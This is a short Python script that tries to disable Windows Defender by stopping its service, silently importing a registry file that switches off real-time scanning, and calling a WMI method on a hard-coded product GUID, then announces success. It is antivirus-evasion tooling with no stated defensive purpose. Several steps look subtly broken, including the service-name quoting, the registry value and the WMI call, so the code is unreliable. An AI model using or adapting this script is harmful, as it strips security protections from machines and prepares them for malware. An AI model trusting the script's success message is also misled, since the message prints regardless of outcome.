import os
import sys
import ctypes
import subprocess

def disable_windows_defender():
    print("Disabling Windows Defender...")

    # Method 1: Stop the Windows Defender service
    subprocess.run(["net stop 'Windows Defender'"], shell=True)

    # Method 2: Modify the registry to disable real-time scanning
    def disable_real_time_scanning():
        f = open("DisableRealTimeScanning.reg", "w")
        f.write("Windows Registry Editor Version 5.00\n\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender]\n\"DisableRealTimeScanning\"=dword:00000001")
        f.close()
        subprocess.run(["regedit.exe /s DisableRealTimeScanning.reg"], shell=True)

    disable_real_time_scanning()

    # Method 3: Use WMI to disable Windows Defender
    import wmi
    c = wmi.WMI()
    for item in c.Win32_Product(**{"IdentifyingNumber": "{6d504a39-7703-4427-a987-e214473a0f89}"}):
        item.Disable()

    print("Windows Defender disabled successfully!")

if __name__ == "__main__":
    disable_windows_defender()
